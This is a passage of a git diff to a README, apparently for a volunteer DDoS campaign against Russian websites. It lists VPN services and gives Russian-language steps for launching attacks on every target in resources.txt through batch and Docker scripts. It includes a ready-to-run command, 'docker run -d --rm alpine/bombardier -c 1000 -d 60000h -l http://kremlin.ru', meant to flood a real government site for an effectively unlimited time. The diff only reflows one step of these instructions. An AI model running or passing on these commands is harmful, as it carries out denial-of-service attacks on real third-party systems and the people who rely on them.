@@ -38,7 +38,10 @@ For a lot of resources or closed for Ukraine so please use Cloud way if cloud un
     - SurfShark: https://surfshark.com/ (paid)
     - Clear VPN: https://clearvpn.com/ (free)
     - Nord VPN: https://nordvpn.com/ (paid)
-5. Запустить все цели из `resources.txt` для Windows в проводнике открываем `run_all_windows.bat` для Linux/Mac `./run_all_docker.sh` для целей из `resources.txt` (или `./run_all_docker.sh файл-с-целями`)
+5. Запустить все цели из `resources.txt` 
+    - для Windows в проводнике открываем `run_all_windows.bat`, либо перетягиваем файл с целями на скрипт
+    - для Linux/Mac `./run_all_docker.sh` 
+    - для целей из `resources.txt` (или `./run_all_docker.sh файл-с-целями`)
 6. Для выполнения с конкретными целями - Скопировать скрипт (например `docker run -d --rm alpine/bombardier -c 1000 -d 60000h -l http://kremlin.ru`) и нажать энтер
 7. Убедиться, что процесс пошёл
 8. Ждать падения рашки
